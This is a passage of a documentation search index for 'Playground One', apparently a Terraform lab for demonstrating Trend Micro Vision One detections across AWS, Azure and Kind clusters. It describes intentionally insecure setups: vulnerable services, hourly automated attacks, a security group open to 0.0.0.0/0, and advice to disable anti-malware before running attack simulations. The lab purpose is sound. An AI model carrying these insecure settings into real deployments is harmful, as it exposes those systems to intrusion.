Cloud and Network","text":"<p>Configuration located in <code>awsone/2-network</code></p> <p>This configuration defines a network with the most commonly used architecture, private and public subnets accross three availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc. Since a VPC is cheap there's no real need to destroy the networking configuration everyday, just leave it as it is and reuse it the next time. This eases the handling of other components.</p> <p>In addition to networking, the following core services are optional:</p> <ul> <li>Active Directory including a Certificate Authority: An AD the PGO way based on cheap <code>t3.medium</code> instances.</li> <li>AWS Managed Active Directory: The AWS native variant. This is more on the expensive side (USD 96.48/mo).</li> <li>Trend Service Gateway. The configured and recommended instance type <code>c5.2xlarge</code> (8 vCPU, 16GiB, 10 Gigabit) is 0.388 USD/h, just to note.</li> </ul>"},{"location":"how-it-works/configurations-aws/#virtual-instances","title":"Virtual Instances","text":"<p>Configuration located in <code>awsone/3-instances</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Basically, a couple of EC2 instances are created with this configuration. One of the linux instances can be used to demo a potential attack path to RDS, if enabled.</p> <p>If you store the agent installers for Server and Workload Security in <code>0-files</code> the instances will connect to Vision One.</p> <p>You can optionally drop any file or installer in the <code>0-files</code> directory which will then be available in the ec2 instances download folder.</p>"},{"location":"how-it-works/configurations-aws/#eks-ec2-cluster","title":"EKS EC2 Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-ec2</code></p> <p>Deployments Configuration located in <code>awsone/8-cluster-ec2-deployments</code></p> <p>Scenario Configuration located in <code>awsone/7-scenarios-ec2</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>So, this is my favorite part. This configuration creates an EKS cluster with some nice key features:</p> <ul> <li>Autoscaling from 1 to 10 nodes</li> <li>Nodes running as Spot instances to save money :-)</li> <li>ALB Load Balancer controller</li> <li>Kubernetes Autoscaler</li> <li>Cluster is located in the private subnets</li> </ul> <p>Automated attacks are running every full hour when scenarios are deployed.</p>"},{"location":"how-it-works/configurations-aws/#eks-fargate-cluster","title":"EKS Fargate Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-fargate</code></p> <p>Deployments Configuration located in <code>awsone/8-cluster-fargate-deployments</code></p> <p>Scenario Configuration located in <code>awsone/7-scenarios-fargate</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>This configuration creates a Fargate EKS cluster with some nice key features:</p> <ul> <li>Fargate Profiles</li> <li>Nodes running as Spot instances to save money :-)</li> <li>An additional AWS managed node group</li> <li>Cluster is located in the private subnets</li> </ul> <p>Automated attacks are running every full hour when scenarios are deployed.</p>"},{"location":"how-it-works/configurations-aws/#ecs-ec2-cluster","title":"ECS EC2 Cluster","text":"<p>Configuration located in <code>awsone/5-cluster-ecs-ec2</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Here we're building an ECS cluster using EC2 instances. Key features:</p> <ul> <li>Autoscaling group for spot instances. On-demand autoscaler can be enabled in Terraform script.</li> <li>ALB Load Balancer</li> <li>Automatic deployment of a vulnerable service (Java-Goof)</li> </ul>"},{"location":"how-it-works/configurations-aws/#ecs-fargate-cluster","title":"ECS Fargate Cluster","text":"<p>Configuration located in <code>awsone/5-cluster-ecs-fargate</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Here we're building an ECS cluster using Fargate profile. Key features:</p> <ul> <li>Fargate profile with spot instances. Fargate with on-demand instances can be enabled in Terraform script.</li> <li>ALB Load Balancer</li> <li>Automatic deployment of a vulnerable service (Java-Goof)</li> </ul> <p>You need to activate Container Security by running the supplied script <code>ecsfg-add-v1cs &lt;CLUSTER NAME&gt;</code> after enabling it within the Vision One console.</p>"},{"location":"how-it-works/configurations-aws/#scenarios-cloudtrail","title":"Scenarios CloudTrail","text":"<p>Automated malicious actions are executed on running this scenario which lead to detections in Observed Attack Techniques and the generation of Workbenches.</p>"},{"location":"how-it-works/configurations-aws/#scenarios-identity","title":"Scenarios Identity","text":"<p>This scenario is currently very simple. It simply populates Active Directory with some users and groups to allow Identity Security to discover these entities. More to come.</p>"},{"location":"how-it-works/configurations-aws/#scenarios-zero-trust-access","title":"Scenarios Zero Trust Access","text":"<p>This scenario prepares an environment to play with Vision One Zero Trust Secure Access in AWS. It includes the following assets:</p> <ul> <li>Microsoft Windows Domain including a Certification Authority</li> <li>A Windows Server standalone</li> <li>A Windows Member Server</li> <li>A Linux host running a dockerized web application</li> <li>Vision One Service Gateway including Active Directory integration</li> <li>Vision One Private Access Gateway</li> </ul>"},{"location":"how-it-works/configurations-aws/#s3-bucket-scanner","title":"S3 Bucket Scanner","text":"<p>Configuration located in <code>awsone/6-bucket-scanner</code></p> <p>Simple S3 Bucket scanner using the File Security Python SDK within a Lambda Function. Scan results will show up on the Vision One console.</p>"},{"location":"how-it-works/configurations-aws/#scenarios-cloud-security-posture-management","title":"Scenarios Cloud Security Posture Management","text":"<p>Creates an S3 bucket with some misconfigurations for Posture Management to detect.</p>"},{"location":"how-it-works/configurations-aws/#deep-security","title":"Deep Security","text":"<p>Configuration located in <code>awsone/9-deep-security</code> and <code>awsone/9-deep-security-workload</code></p> <p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>The workload configuration creates a demo configuration for Deep Security and two custom policies. Two linux and one windows instances are created and activated with Deep Security. Some minutes after instance creation the activated computers will run a recommendation scan.</p> <p>Check the Scenarios section to see available integration and migration scenarios.</p>"},{"location":"how-it-works/configurations-aws/#workload-security","title":"Workload Security","text":"<p>The workload configuration creates a demo configuration for Workload Security and two custom policies. Linux and one windows instances are created and activated with Workload Security. Some minutes after instance creation the activated computers will run a recommendation scan.</p> <p>Check the Scenarios section to see available integration and migration scenarios.</p>"},{"location":"how-it-works/configurations-aws/#instance-types-in-use-as-of-062024","title":"Instance Types in Use as of 06/20/24","text":"<p>Region: <code>eu-central-1</code></p> Instance name On-Demand hourly rate vCPU Memory Storage Network performance Configuration t2.micro $0.0134 1 1 GiB EBS Only Low to Moderate Deep Security Bastion t3.medium $0.048 2 4 GiB EBS Only Up to 5 Gigabit Various t3.xlarge $0.192 4 16 GiB EBS Only Up to 5 Gigabit Deep Security Manager c5.2xlarge $0.388 8 16 GiB EBS Only Up to 10 Gigabit Service Gateway"},{"location":"how-it-works/configurations-azure/","title":"Playground One Azure Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>azone\n\u2514\u2500\u2500 aks (4-cluster-aks)\n    \u251c\u2500\u2500 aks-deployments (8-cluster-aks-deployments)\n \u00a0\u00a0 \u2514\u2500\u2500 scenarios (7-scenarios-aks)\n</code></pre> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-azure/#aks-cluster","title":"AKS Cluster","text":"<p>Configuration located in <code>azone/4-cluster-aks</code></p> <p>Deployments Configuration located in <code>azone/8-cluster-aks-deployments</code></p> <p>Scenario Configuration located in <code>azone/7-scenarios-aks</code></p> <p>This configuration creates a Fargate EKS cluster with some nice key features:</p> <ul> <li>Azure Application Gateway as a web traffic (OSI layer 7) load balancer.</li> <li>Autoscaling</li> </ul> <p>Automated attacks are running every full hour when scenarios are deployed.</p>"},{"location":"how-it-works/configurations-kind/","title":"Playground One Kind Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>kindone\n\u2514\u2500\u2500 kind (4-cluster-kind)\n    \u251c\u2500\u2500 kind-deployments (8-cluster-kind-deployments)\n    \u2514\u2500\u2500 scenarios (7-scenarios-kind)\n</code></pre> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations-kind/#kind-cluster","title":"Kind Cluster","text":"<p>Configuration located in <code>kindone/4-cluster-kind</code></p> <p>Deployments Configuration located in <code>kindone/8-cluster-kind-deployments</code></p> <p>Scenario Configuration located in <code>kindone/7-scenarios-kind</code></p> <p>Useful for quickly testing out Kubernetes things :-).</p> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations/","title":"Playground One Configurations","text":"<p>The Playground One currently supports AWS, Azure and local Kind Kubernetes clusters.</p> <p>Typically, new features will be added first for AWS, second for Azure and in future GCP.</p> <p>Refer to the specific chapters for the different supported Clouds:</p> <ul> <li>AWS</li> <li>Azure</li> <li>GCP</li> <li>Kind</li> </ul>"},{"location":"how-it-works/orchestration/","title":"Orchestration","text":""},{"location":"how-it-works/orchestration/#how-it-works","title":"How it works","text":"<p>The Playground One utilizes Terraform to maintain the environment. For best flexibility and cost optimization it is structured into several Terraform configurations. You can also view these configurations as modules that can be linked together as needed.</p> <p>Note: Currently, the only cloud supported is AWS, when required other public cloud providers might follow.</p>"},{"location":"how-it-works/orchestration/#what-is-terraform","title":"What is Terraform?","text":"<p>Terraform is an infrastructure as code tool that lets you build, change, and version cloud and on-prem resources safely and efficiently. It is maintained by HashiCorp.</p> <p>HashiCorp Terraform is an infrastructure as code tool that lets you define both cloud and on-prem resources in human-readable configuration files that you can version, reuse, and share. You can then use a consistent workflow to provision and manage all of your infrastructure throughout its lifecycle. Terraform can manage low-level components like compute, storage, and networking resources, as well as high-level components like DNS entries and SaaS features.</p>"},{"location":"how-it-works/orchestration/#how-does-terraform-work","title":"How does Terraform work?","text":"<p>Terraform creates and manages resources on cloud platforms and other services through their application programming interfaces (APIs). Providers enable Terraform to work with virtually any platform or service with an accessible API.</p> <p></p> <p>HashiCorp and the Terraform community have already written thousands of providers to manage many different types of resources and services. You can find all publicly available providers on the Terraform Registry, including Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, and many more.</p> <p></p> <p>The core Terraform workflow consists of three stages:</p> <p>Write: You define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer.</p> <p>Plan: Terraform creates an execution plan describing the infrastructure it will create, update, or destroy based on the existing infrastructure and your configuration.</p> <p>Apply: On approval, Terraform performs the proposed operations in the correct order, respecting any resource dependencies. For example, if you update the properties of a VPC and change the number of virtual machines in that VPC, Terraform will recreate the VPC before scaling the virtual machines.</p>"},{"location":"integrations/container-security/","title":"Vision One Container Security","text":""},{"location":"integrations/container-security/#container-security-with-the-playground-one-eks-ec2-cluster","title":"Container Security with the Playground One EKS EC2 Cluster","text":"<p>This guide provides step-by-step instructions on how to use Vision One Container Security on a Playground One EKS EC2 cluster.</p> <p>Prerequisites:</p> <ul> <li>Vision One API Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Inventory<ul> <li>View</li> <li>Configure Settings</li> </ul> </li> <li>Container Protection<ul> <li>View</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Required information:</p> <ul> <li>Name of already existing Container Protection Policy to assign to the cluster installation.</li> </ul> <p>Steps:</p> <ol> <li>Run the configuration tool with <code>pgo --config</code> to set or verify the values in the <code>Vision One Container Security</code> section.</li> <li> <p>Create the EKS cluster</p> <pre><code># EKS with EC2 nodes\npgo --apply eks-ec2\n\n# EKS with Fargate profiles\npgo --apply eks-fg\n</code></pre> </li> </ol> <p>Done. Playground One uses the Terraform provider of Vision One Container Security.</p>"},{"location":"integrations/container-security/#container-security-with-the-playground-one-ecs-fargate-cluster","title":"Container Security with the Playground One ECS Fargate Cluster","text":"<p>If you are deploying Container Security in an ECS Fargate environment, you have to carry out some additional steps after adding the instance. See official documentation for the details.</p> <p>Playground One simplifies these steps.</p> <p>Prerequisites:</p> <ul> <li>Deployed ECS Fargate cluster configuration (<code>pgo -a ecs</code>).</li> </ul> <p>Required information:</p> <ul> <li>ECS Fargate Cluster name from ecs outputs (<code>pgo -o ecs</code>).</li> </ul> <p>Steps:</p> <ol> <li>On Vision One, head over to <code>Cloud Security Operations --&gt; Container Security --&gt; Container Inventory</code>.</li> <li>Select <code>[Amazon ECS] --&gt; [Account ID] --&gt; [Region] --&gt; [Your ECS Fargate Cluster]</code>.</li> <li>Select a Policy and enable Runtime Security.</li> <li>Run <code>ecsfg-add-v1cs &lt;CLUSTER NAME&gt;</code></li> </ol> <p>Done.</p> <p>Note: Deletion of the cluster via <code>pgo -d ecs</code> will fail until you manually delete the <code>trendmicro-scout</code>-service in the ECS console. Then delete the cluster in the console. There will be an IAM policy starting with your cluster name not being deleted automatically.</p>"},{"location":"integrations/deep-security/","title":"Deep Security","text":"<p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>The Deep Security Manager is deployed to the private subnet. It uses an AWS RDS PostgreSQL in the private subnet. Access to Deep Security is granted by the help of a bastion host in the public subnet. This host supports ssh tunneling and acts as an upstream proxy on port 4119.</p> <p>To create a Deep Security instance run</p> <pre><code>pgo --apply dsm\n</code></pre> <p>To create Computers activated with the Deep Security Manager run</p> <pre><code>pgo --apply dsw\n</code></pre> <p>To destroy the instance run</p> <pre><code>pgo --destroy dsw\npgo --destroy dsm\n</code></pre> <p>An applied dsm configuration can be quickly stopped and started via the commands <code>dsm stop</code> and <code>dsm start</code> without losing any configurations within Deep Security.</p>"},{"location":"integrations/elastic-stack/","title":"Elastic Stack (ELK Stack)","text":"<p>It's comprised of Elasticsearch, Kibana, Beats, and Logstash (also known as the ELK Stack).</p> <p>Link: https://www.elastic.co/elastic-stack/</p>"},{"location":"integrations/elastic-stack/#what-is-elasticsearch","title":"What is Elasticsearch?","text":"<p>Elasticsearch is the distributed search and analytics engine at the heart of the Elastic Stack. Elasticsearch is where the indexing, search, and analysis magic happens.</p> <p>Elasticsearch provides near real-time search and analytics for all types of data. Whether you have structured or unstructured text, numerical data, or geospatial data, Elasticsearch can efficiently store and index it in a way that supports fast searches. You can go far beyond simple data retrieval and aggregate information to discover trends and patterns in your data. And as your data and query volume grows, the distributed nature of Elasticsearch enables your deployment to grow seamlessly right along with it.</p>"},{"location":"integrations/elastic-stack/#kibana-your-window-into-elastic","title":"Kibana - your window into Elastic","text":"<p>Kibana enables you to give shape to your data and navigate the Elastic Stack. Kibana enables you to interactively explore, visualize, and share insights into your data and manage and monitor the stack. </p> <p>With Kibana, you can:</p> <ul> <li>Search, observe, and protect your data. From discovering documents to analyzing logs to finding security vulnerabilities, Kibana is your portal for accessing these capabilities and more.</li> <li>Analyze your data. Search for hidden insights, visualize what you\u2019ve found in charts, gauges, maps, graphs, and more, and combine them in a dashboard.</li> <li>Manage, monitor, and secure the Elastic Stack. Manage your data, monitor the health of your Elastic Stack cluster, and control which users have access to which features.</li> </ul>"},{"location":"integrations/elastic-stack/#logstash-and-beats","title":"Logstash and Beats","text":"<p>Logstash and Beats facilitate collecting, aggregating, and enriching your data and storing it in Elasticsearch.</p>"},{"location":"integrations/endpoint-security/","title":"Vision One Endpoint Security Server &amp; Workload Protection","text":"<p>Three different instances are currently provided by the Playground One with different configurations:</p> <p>Instance Web1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>Nginx deployment</li> <li>Vision One Endpoint Security Endpoint Sensor for Server &amp; Workload Protection</li> </ul> <p>Instance Db1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>MySql databse</li> <li>Vision One Endpoint Security Endpoint Sensor for Server &amp; Workload Protection</li> </ul> <p>Instance Srv1:</p> <ul> <li>Windows Server 2022 Standalone Server</li> <li>Vision One Endpoint Security Endpoint Sensor for Server &amp; Workload Protection</li> </ul> <p>All instances can be integrated with Vision One Endpoint Security for Server &amp; Workload Protection and have access to the Atomic Launcher (if provided).</p> <p>The instances are created within a public subnet of Playground One's VPC. They all get an EC2 instance role assigned providing them the ability to access installer packages stored within an S3 bucket.</p> <p>All instances including the Windows Server are accessible via ssh and key authentication. RDP for Windows is supported in addition to this.</p> <p>Server &amp; Workload Protection: Example with full stack deployment</p> <p></p>"},{"location":"integrations/endpoint-security/#optional-drop-vision-one-installer-packages","title":"Optional: Drop Vision One Installer Packages","text":"<p>If you want the instances automatically to be activated against your Server and Workload Protection Manager instance you need to download the installer packages for Vision One Endpoint Security for Windows and/or Linux from your Vision One instance. You need to do this manually since these installers are specific to your environment.</p> <p>The downloaded files are named something similar like</p> <p><code>TMServerAgent_Windows_auto_64_Server_and_Workload_Protection_Manager_-_CLOUDONE-ID.zip</code></p> <p>and/or</p> <p><code>TMServerAgent_Linux_auto_64_Server_and_Workload_Protection_Manager_-CLOUDONE-ID.tar</code>.</p> <p>Rename them to <code>TMServerAgent_Linux.tar</code> and <code>TMServerAgent_Windows.zip</code> respectively and copy the file(s) to <code>${ONEPATH}/awsone/0-files</code>.</p>"},{"location":"integrations/endpoint-security/#optional-server-workload-protection-event-based-tasks","title":"Optional: Server &amp; Workload Protection Event-Based Tasks","text":"<p>Create Event-Based Tasks to automatically assign Linux or Windows server policies to the machines.</p> <p>Agent-initiated Activation Linux</p> <ul> <li>Actions: Assign Policy: Linux Server</li> <li>Conditions: \"Platform\" matches \".*Linux.*\"</li> </ul> <p>Agent-initiated Activation Windows</p> <ul> <li>Actions: Assign Policy: Windows Server</li> <li>Conditions: \"Platform\" matches \".*Windows.*\"</li> </ul>"},{"location":"integrations/endpoint-security/#optional-drop-atomic-launcher-packages","title":"Optional: Drop Atomic Launcher Packages","text":"<p>If you want to experiment with Atomic Launcher download the packages (latest Windows and Linux) from here and store them in the  <code>${ONEPATH}/awsone/0-files</code> directory as well.</p> <p>Your <code>${ONEPATH}/awsone/0-files</code>-directory should look like this:</p> <pre><code>-rw-rw-r-- 1 user user 17912014 Aug  1 14:50 atomic_launcher_linux_1.0.0.1009.zip\n-rw-rw-r-- 1 user user 96135367 Aug  1 14:50 atomic_launcher_windows_2.zip\n-rw-rw-r-- 1 user user        0 Jul 28 06:22 see_documentation\n-rw-rw-r-- 1 user user      144 Aug  1 14:33 TMServerAgent_Linux_deploy.sh\n-rw-rw-r-- 1 user user 27380224 Aug  1 14:50 TMServerAgent_Linux.tar\n-rw-rw-r-- 1 user user     1145 Aug  1 14:33 TMServerAgent_Windows_deploy.ps1\n-rw-rw-r-- 1 user user  3303522 Aug  1 14:50 TMServerAgent_Windows.zip\n</code></pre> <p>The Atomic Launcher is stored within the downloads folder of each of the instances.</p> <p>The unzip password is <code>virus</code>.</p> <p>You should disable Anti Malware protection und set the IPS module to detect only before using Atomic Launcher :-).</p>"},{"location":"integrations/prometheus-grafana/","title":"Prometheus and Grafana","text":""},{"location":"integrations/prometheus-grafana/#what-is-prometheus","title":"What is Prometheus?","text":"<p>Prometheus is an open-source systems monitoring and alerting toolkit originally built at SoundCloud. Since its inception in 2012, many companies and organizations have adopted Prometheus, and the project has a very active developer and user community. It is now a standalone open source project and maintained independently of any company. To emphasize this, and to clarify the project's governance structure, Prometheus joined the Cloud Native Computing Foundation in 2016 as the second hosted project, after Kubernetes.</p> <p>Prometheus collects and stores its metrics as time series data, i.e. metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels.</p> <p>For more elaborate overviews of Prometheus, see the resources linked from the media section.</p> <p>Prometheus's main features are:</p> <ul> <li>a multi-dimensional data model with time series data identified by metric name and key/value pairs</li> <li>PromQL, a flexible query language to leverage this dimensionality</li> <li>no reliance on distributed storage; single server nodes are autonomous</li> <li>time series collection happens via a pull model over HTTP</li> <li>pushing time series is supported via an intermediary gateway</li> <li>targets are discovered via service discovery or static configuration</li> <li>multiple modes of graphing and dashboarding support</li> </ul>"},{"location":"integrations/prometheus-grafana/#what-is-grafana","title":"What is Grafana?","text":"<p>In a nutshell: Dashboard anything. Observe everything.</p> <p>Query, visualize, alert on, and understand your data no matter where it\u2019s stored. With Grafana you can create, explore, and share all of your data through beautiful, flexible dashboards.</p>"},{"location":"integrations/prometheus-grafana/#playground-one-integration","title":"Playground One Integration","text":"<p>To enable/disable the Prometheus &amp; Grafana combo and to set the administrator password run <code>pgo --configure</code>. The package comes preconfigured and ready for use.</p> <p>To get the DNS names of Prometheus and Grafana check the outputs of the EKS configuraiton with <code>pgo -o eks</code></p> <pre><code># Example\nloadbalancer_dns_grafana = \"k8s-promethe-promethe-95d61839fe-676288571.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_prometheus = \"k8s-promethe-promethe-a040b2a261-633411715.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>Copy the Grafana URL to your browser and authenticate with <code>admin</code> and the password you have set.</p> <p>Then head over to Dashboards </p> <p></p> <p>and search for <code>kubernetes</code>:</p> <p></p> <p>Select any of the dashboards and start playing.</p> <p></p> <p>If you want to use PromQL directly, head over to the Prometheus frontend.</p>"},{"location":"integrations/splunk/","title":"Splunk","text":"<p>Splunk is a big data platform that simplifies the task of collecting and managing massive volumes of machine-generated data and searching for information within it. The technology is used for business and web analytics, application management, compliance, and security.</p> <p>Splunk is an advanced and scalable form of software that indexes and searches for log files within a system and analyzes data for operational intelligence. The software is responsible for splunking data, which means it correlates, captures, and indexes real-time data, from which it creates alerts, dashboards, graphs, reports, and visualizations. This helps organizations recognize common data patterns, diagnose potential problems, apply intelligence to business operations, and produce metrics.</p> <p>Splunk\u2019s software can be used to examine, monitor, and search for machine-generated big data through a browser-like interface. It makes searching for a particular piece of data quick and easy, and more importantly, does not require a database to store data as it uses indexes for storage.</p> <p>Link: https://www.splunk.com/</p> <p>Vision One has the capability to integrate with Splunk in various ways. Some of these are covered in Scenarios.</p>"},{"location":"integrations/workload-security/","title":"Workload Security","text":"<p>This configuration is to simulate a Workload Security environment meant to be used in integration and migration scenarios.</p> <p>To create Computers activated with Workload Security run</p> <pre><code>pgo --apply wsw\n</code></pre> <p>To destroy the instance run</p> <pre><code>pgo --destroy wsw\n</code></pre>"},{"location":"integrations/xdr-for-containers/","title":"Vision One XDR for Containers","text":"<p>Note: At the time of writing, XDR for Containers is in an early preview stage and only one to be protected VPC is supported. The cluster variants provided by Playground One support Application Load Balancing which is required for XDR for Containers.</p> <p>You need to create a connection with XDR for Containers by going through the workflow in your Vision One environment.</p>"},{"location":"integrations/xdr-for-containers/#connect-xdr-for-containers-with-the-playground-one","title":"Connect XDR for Containers with the Playground One","text":"<p>Before connecting XDR for Containers you need to have the VPC and network of Playground One created already.</p> <pre><code>pgo --apply nw\n</code></pre> <p>Note: You don't need to destroy the VPC and network each time because this would mean to disconnect Vision One from it and reestablish the connection the next time. This takes about 20 minutes overall. So leave the VPC as it is.</p> <p>Required information:</p> <ul> <li>Trend Cloud One API Key</li> <li>Trend Cloud One Region</li> <li>AWS Account ID</li> <li>AWS VPC ID</li> <li>VPC Region</li> </ul> <p>Follow the deployment instructions from Vision One. You can query your <code>AWS VPC ID</code> by running <code>pgo --output nw</code>.</p> <p>Note: Make sure to deploy the stack in the region of the VPC when pressing <code>[Launch Stack]</code>.</p> <p></p> <p>All provided clusters from Playground One can be used with XDR for Containers.</p>"},{"location":"integrations/xdr-for-containers/#scenarios","title":"Scenarios","text":"<ul> <li>Tomcat Remote Code Execution</li> <li>JNDI Injection in HTTP Request</li> <li>Apache Struts Multipart Encoding Command Injection (ECS)</li> <li>Apache Struts Multipart Encoding Command Injection (EKS)</li> </ul>"},{"location":"scenarios/asrm/iam-user-attack-path/","title":"Scenario: ASRM to detect Predictive Attack Path to RDS via IAM User","text":"<p>DRAFT</p>"},{"location":"scenarios/asrm/iam-user-attack-path/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS Cloud Account integrated with Vision One</li> </ul> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n</code></pre>"},{"location":"scenarios/asrm/iam-user-attack-path/#setup","title":"Setup","text":"<p>The Playground One configuration for EC2 (<code>ec2</code> or <code>instances</code>) can create an IAM User and IAM User Group with RDS Full Access and some EC2 action permissions when the creation of Potential Attack Path(s) is enabled in the config tool. The one of interest is the user <code>dbadmin</code> within the group dbadmins.</p> <p>Verify, that you have <code>Vision One ASRM - create Potential Attack Path(s)</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]:\n...\n</code></pre> <pre><code># With Potential Attack Path enabled\npgo --apply instances\n</code></pre> <p>The IAM User is detected by Vision One ASRM after some time when you configured your CAM stack properly. The full analysis which should lead to a potential attack path as seen in the below screenshot can take up to 48hs.</p> <p></p> <p>Below the Asset Graph of the high risk instance:</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/iam-user-attack-path/#tear-down","title":"Tear Down","text":"<p>At minimum, disable <code>Vision One ASRM - create Potential Attack Path(s)</code> in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]: false\n...\n</code></pre> <pre><code>pgo --apply instances\n</code></pre>"},{"location":"scenarios/asrm/virtual-machine-attack-path/","title":"Scenario: ASRM to detect Predictive Attack Path to RDS via EC2","text":""},{"location":"scenarios/asrm/virtual-machine-attack-path/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS Cloud Account integrated with Vision One</li> </ul> <p>Insecure Configuration</p> <p>Playing through this scenario requires the Playground One to be configured insecurely. This is because one of the AWS EC2 Security Groups will be configured to <code>0.0.0.0/0</code> inbound rules. Depending on the governance restrictions you need to comply with you might receive a (friendly) notification. </p> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n</code></pre>"},{"location":"scenarios/asrm/virtual-machine-attack-path/#setup","title":"Setup","text":"<p>The Playground One configuration for EC2 (<code>ec2</code> or <code>instances</code>) creates two Linux servers when enabled in the config tool. The one of interest is the <code>db1</code> instance since it get's an instance profile assigned which allows read access to RDS. Contrary to all other instances this instance will use a dedicated security group which is open to the internet using the CIDR block <code>0.0.0.0/0</code>.</p> <p>Verify, that you have <code>EC2 - create Linux EC2</code>, <code>EC2 - create RDS Database</code> and <code>Vision One ASRM - create Potential Attack Path(s)</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nEC2 - create Linux EC2 [true]:\n...\nEC2 - create RDS Database [true]: \n...\nVision One ASRM - create Potential Attack Path(s) [true]:\n...\n</code></pre> <p>A (free-tier) PostgreSQL dabase is automatically created when applying the configuration. It is not actively used but required to have a target in the potential attack path.</p> <pre><code># With Potential Attack Path enabled\npgo --apply network\n\n# With Linux machines enabled\npgo --apply instances\n</code></pre> <p>The Linux instances are detected by Vision One ASRM after some time when you configured your CAM stack properly. The full analysis which should lead to a potential attack path for the <code>db1</code> instance as seen in the below screenshot can take up to 48hs.</p> <p></p> <p>As we can see, there is a high risk EC2 instance listed with a risk score of 72. Following the link of <code>i-0726e545c73222cbf</code> will explain us the cause of the risk rating. The instance is detected as an Internet-facing EC2 instance with unrestricted Access.</p> <p>Additionally, the full potential attack path is shown in the lower half of the screen. It shows that one might be able to reach out to an RDS instance due to the assigned IAM instance role.</p> <p></p> <p>Navigating to the tab <code>Asset Risk Graph</code> creates a graphical representaion on the currently inspected asset. The instance of interest is the in grey highlighted one. On it's right the EC2 instance role granting database access is shown.</p> <p>One can easily review the all the dependencies of this instance such as who can access the instance and why, the assigned security group and mounted volumes.</p> <p></p> <p>The Asset Profile presents detailed information about the asset such as Region, Availability zone, VPC ID, Public IP, architecture, and tags. Based on the analyses of Vision One, this instance is of Medium criticality. Depending on it's business relevance this could be easily adapted, if required.</p> <p></p> <p>Going back to <code>Attack Surface Discovery --&gt; Cloud Assets</code> followed by enabling the <code>Cloud Risk Graph</code> in the top right we can use the region view, in this case <code>eu-central-1</code> to let Vision One visually present us a high level view on what is deployed in the region of interest. The highlighted subnet <code>subnet-03930b609d1dbc4cd</code> indicates that an EC2 with a high risk score of 72 exists in it.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/virtual-machine-attack-path/#tear-down","title":"Tear Down","text":"<p>At minimum, disable <code>Vision One ASRM - create Potential Attack Path(s)</code> in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]: false\n...\n</code></pre> <pre><code>pgo --apply network\n</code></pre>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/","title":"Scenario: CloudFormation IaC Scanning as GitHub Action","text":""},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One API-Key with the following permissions:<ul> <li>Cloud Posture<ul> <li>View</li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-template-scanner.</li> </ul>"},{"location":"scenarios/asrm/pm/template-scanning-cfn-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically scan a Cloudformation template with Vision One Cloud Posture Template Scanning. The scan will check the configuration for misconfigurations.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Cloudformation environment with rain.</li> <li>Use the template scanner to scan for misconfigurations.</li> <li>Upload scan artifacts.</li> <li>Eventually fail the 